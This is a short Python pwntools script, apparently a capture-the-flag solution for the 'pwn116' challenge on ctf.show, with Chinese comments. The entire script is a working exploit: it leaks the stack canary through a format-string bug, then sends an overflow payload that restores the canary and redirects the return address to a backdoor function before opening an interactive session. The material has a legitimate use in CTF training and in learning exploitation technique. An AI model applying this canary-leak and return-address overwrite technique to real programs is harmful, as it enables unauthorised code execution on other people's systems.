from pwn import *
io = remote("pwn.challenge.ctf.show",28117)
# io = process("./pwn116")
backdoor = 0x8048586

#逐个利用fmt漏洞调试，经测试，%15$p ,%16$p会出现/00,标准的canary
# 利用这一点，泄漏canary

leak = io.sendline(b'%15$p')
io.recvuntil(b'0x')
# canary = int(io.recv(8),16)
canary = int(io.recv()[:8],16)
print(canary)

#构造payload
payload = b'a' *(32) + p32(canary) + b'a'*12 + p32(backdoor)

io.sendline(payload)
io.interactive()
